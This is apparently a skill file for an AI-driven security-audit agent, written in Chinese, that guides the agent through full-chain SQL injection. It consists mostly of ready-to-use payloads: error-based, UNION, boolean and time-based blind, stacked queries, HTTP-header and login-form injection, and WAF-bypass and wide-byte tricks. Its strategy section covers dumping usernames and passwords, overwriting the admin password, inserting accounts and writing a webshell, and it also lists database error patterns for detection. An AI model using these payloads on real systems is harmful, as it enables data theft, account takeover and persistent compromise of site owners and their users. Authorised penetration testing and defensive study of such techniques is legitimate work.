---
name: webapp-sqli
description: Web应用SQL注入全链路检测与利用
tags: sql, injection, database, mysql, postgresql, mssql, oracle, sqli, union, blind, error, stacked, waf-bypass, widechar
priority: 95
phase: exploit
chain: recon -> webapp-sqli -> post-exploit
author: multi-agent-security-audit
---

# SQL注入全链路技能

## 闭合方式速查

注入第一步：确定闭合方式。按以下顺序逐一测试，观察页面变化：

| 闭合方式 | 测试payload | 适用场景 |
|----------|------------|---------|
| 无闭合(数字型) | `id=1 AND 1=2` | 页面变化说明数字型 |
| 单引号 `'` | `id=1'` | 报错或页面异常 |
| 双引号 `"` | `id=1"` | 报错或页面异常 |
| 单引号+括号 `')` | `id=1')--+` | 正常返回说明闭合正确 |
| 双引号+括号 `")` | `id=1")--+` | 正常返回说明闭合正确 |
| 双括号 `'))` | `id=1'))--+` | 少见但存在 |

注释符：`--+`、`#`（URL中用`%23`）、`-- `（注意末尾空格）

## 注入类型决策树

```
目标有回显？
├── 有回显
│   ├── 有报错信息 → 报错注入(最快)
│   └── 无报错但有数据展示 → UNION联合注入
└── 无回显
    ├── 页面有布尔差异(true/false两种状态) → 布尔盲注
    └── 页面无差异 → 时间盲注(SLEEP)
```

## Detect

- SQL syntax.*error
- mysql_fetch
- ORA-\d+
- SQLSTATE
- Unclosed quotation
- syntax error
- Warning.*mysql_
- PostgreSQL.*ERROR
- XPATH syntax error
- Duplicate entry.*for key
- You have an error in your SQL

## Payloads

### error_based
```
' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--+
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
" AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)--+
") AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))--+
') AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)--+
```

### union_based
```
' UNION SELECT 1,2,3--+
' UNION SELECT 1,DATABASE(),VERSION()--+
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=DATABASE()--+
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--+
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--+
```

### time_based
```
' AND SLEEP(3)--+
' AND IF(1=1,SLEEP(3),0)--+
" AND SLEEP(3)--+
") AND SLEEP(3)--+
') AND SLEEP(3)--+
1 AND SLEEP(3)--+
' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=115,SLEEP(3),0)--+
```

### boolean_based
```
' AND 1=1--+
' AND 1=2--+
' AND LENGTH(DATABASE())>0--+
' AND ASCII(SUBSTRING(DATABASE(),1,1))>100--+
```

### stacked_query
```
'; SELECT SLEEP(3)--+
'; INSERT INTO users(username,password) VALUES('hacked','hacked')--+
'; UPDATE users SET password='hacked' WHERE username='admin'--+
```

### header_injection
```
User-Agent: ' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE())) AND '1'='1
Referer: ' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE())) AND '1'='1
Cookie: uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--+
```

### waf_bypass
```
双写绕过: OORR->OR, AANDND->AND, UNIUNIONON->UNION, SELESELECTCT->SELECT
大小写混合: SeLeCt, UnIoN, AnD, oR
空格替代: /**/ %0a %0b %0c %09 ()括号代替空格
注释符替代: --+ #(%23) ;%00 AND '1'='1(闭合代替注释)
宽字节绕过: %df' %bf' %cf' (GBK编码吃掉反斜杠)
编码绕过: 0x7573657273代替'users', CHAR(117,115,101,114,115)代替'users'
```

### post_form
```
uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--+&passwd=test&submit=Submit
uname=admin%bf' OR 1=1--+&passwd=test&submit=Submit
login_user=admin&login_password=admin' OR 1=1--+&mysubmit=Login
```

## Strategy

### 标准攻击流程
1. 侦察: fetch_page获取页面，extract_forms提取表单，确定注入点
2. 闭合探测: 逐一测试闭合方式，观察页面变化或报错
3. 注入类型判断: 有报错->报错注入，有回显->UNION，无回显->盲注
4. 数据提取: database() -> table_name -> column_name -> 数据
5. 深入利用: 堆叠查询写数据/读文件/写WebShell

### 注入点优先级
1. GET参数(id/sort/search等)
2. POST表单(uname/passwd/login_password)
3. HTTP头(User-Agent/Referer/Cookie) — 需要先登录成功
4. Cookie值 — 可能有Base64编码

### 关键纪律
- 参数名保持页面原始大小写
- POST表单用content_type="application/x-www-form-urlencoded"
- 宽字节注入时%df/%bf不要被URL解码
- ORDER BY注入不能用UNION，用报错注入或IF条件盲注
- 二次注入：注册恶意用户名->登录->修改密码触发
- 每确认一个漏洞立即record_finding
